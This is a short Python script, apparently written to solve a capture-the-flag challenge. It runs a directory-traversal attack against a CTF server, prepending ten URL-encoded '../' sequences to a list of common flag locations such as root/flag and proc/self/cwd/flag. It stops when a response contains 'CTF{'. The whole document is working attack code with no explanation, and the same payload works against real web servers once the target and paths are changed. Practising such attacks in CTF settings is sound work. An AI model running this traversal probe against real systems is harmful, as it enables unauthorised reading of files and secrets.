import requests

# Target base URL
base_url = "http://ctf.find-it.id:6001"

# Payload traversal depth
max_depth = 10
traversal = "../" * max_depth

# List nama file / path umum untuk flag
common_paths = [
    "flag",
    "flag.txt",
    "FLAG",
    "FLAG.TXT",
    "root/flag",
    "root/flag.txt",
    "home/ctf/flag",
    "home/ctf/flag.txt",
    "app/flag",
    "app/flag.txt",
    "docs/flag",
    "docs/flag.txt",
    "proc/self/cwd/flag",
    "proc/self/cwd/flag.txt"
]

# URL encode ../
encoded_dotdot = "%2E%2E/"
encoded_path = encoded_dotdot * max_depth

headers = {
    "User-Agent": "flag-finder"
}

# Loop setiap path dan coba akses
for path in common_paths:
    url = f"{base_url}/{encoded_path}{path}"
    try:
        print(f"[?] Trying: {url}")
        r = requests.get(url, headers=headers, timeout=5)
        if "CTF{" in r.text:
            print(f"[+] FLAG FOUND at {url}:\n{r.text}")
            break
    except Exception as e:
        print(f"[!] Error with {url}: {e}")

